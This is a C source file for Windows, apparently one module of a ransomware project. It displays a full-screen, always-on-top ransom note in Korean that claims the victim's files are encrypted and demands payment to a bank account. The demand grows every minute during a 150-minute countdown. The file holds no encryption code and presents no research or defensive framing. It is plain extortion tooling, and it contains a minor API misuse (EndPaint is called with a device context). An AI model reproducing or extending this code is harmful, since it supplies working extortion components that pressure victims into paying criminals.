#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "ransomenote.h"

#define ID_TIMER 1
#define TIME_LIMIT_SECONDS 9000  // 150분
#define BASE_AMOUNT 30000000
#define INCREMENT_PER_MIN 2000000

static int remaining_seconds = TIME_LIMIT_SECONDS;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        SetTimer(hwnd, ID_TIMER, 1000, NULL);
        break;

    case WM_TIMER:
        if (remaining_seconds > 0) {
            remaining_seconds--;
        }
        InvalidateRect(hwnd, NULL, TRUE);
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        RECT rect;
        GetClientRect(hwnd, &rect);
        SetBkMode(hdc, TRANSPARENT);

        HFONT hFont = CreateFontA(48, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
        SelectObject(hdc, hFont);
        SetTextColor(hdc, RGB(255, 0, 0));

        int minutes = remaining_seconds / 60;
        int seconds = remaining_seconds % 60;
        int penalty_minutes = (TIME_LIMIT_SECONDS - remaining_seconds) / 60;
        int current_amount = BASE_AMOUNT + penalty_minutes * INCREMENT_PER_MIN;

        char message[1024];
        snprintf(message, sizeof(message),
            "당신의 모든 파일은 암호화되었습니다!\n\n"
            "복호화를 원한다면 아래 계좌로 금액을 송금하십시오.\n"
            "국민은행 71820101289762\n\n"
            "요구 금액: %d원\n"
            "남은 시간: %02d분 %02d초\n"
            "시간이 지날수록 복구 비용은 증가합니다.",
            current_amount, minutes, seconds);

        DrawTextA(hdc, message, -1, &rect, DT_CENTER | DT_VCENTER | DT_WORDBREAK);
        EndPaint(hdc, &ps);
        DeleteObject(hFont);
        break;
    }

    case WM_CLOSE:
        KillTimer(hwnd, ID_TIMER);       // 타이머 종료
        DestroyWindow(hwnd);             // 외부에서 닫기 허용
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return 0;
}

void create_ransom_note(void) {
    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RansomNoteWindow";
    wc.hbrBackground = CreateSolidBrush(RGB(255, 255, 255));

    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(
        WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "RansomNoteWindow", "WARNING",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, wc.hInstance, NULL);

    if (!hwnd) {
        MessageBoxA(NULL, "랜섬노트 창 생성 실패", "에러", MB_ICONERROR);
        return;
    }

    SetLayeredWindowAttributes(hwnd, RGB(255, 255, 255), 0, LWA_COLORKEY);

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
        Sleep(10);
    }
}
